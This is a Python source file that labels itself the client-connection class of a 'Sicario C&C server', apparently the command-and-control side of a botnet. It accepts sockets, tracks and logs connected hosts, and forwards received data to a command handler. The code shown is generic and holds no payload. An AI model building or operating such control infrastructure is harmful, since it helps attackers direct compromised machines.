#!/usr/bin/python

import sicario
import log
import commands
import client

# Sicario C&C server 
# Client class

from threading import Thread

clients = []

class Client (Thread):
	def __init__ (self, sock, sema):
		super(Client, self).__init__()
		self.sock = sock
		self.sock.settimeout(10)
		self.sema = sema
		self.connection = True
		
	def run (self):
		clients.append(self)
		log.log('{} connected! (socket level) ({} clients now)'.format(self.sock.getpeername()[0], len(clients)))

		highClient = client.Client(self.sock.getpeername()[0], self)
		
		while self.connection == True:
			data = self.sock.recv(1024).strip('\n')
			if not data: 
				clients.remove(self)
				log.log('{} disconnected! (socket level) ({} clients left)'.format(self.sock.getpeername()[0], len(clients)))
				self.sock.close()
				break
				
			highClient.on_command(data)

	def send(self, arg):
		self.sock.send(arg)
		
	def stop(self):
		log.log('{} got disconnected by server! ({} clients now)'.format(self.sock.getpeername()[0], len(clients)-1))
		self.connection = False
		self.sock.close()
		clients.remove(self)
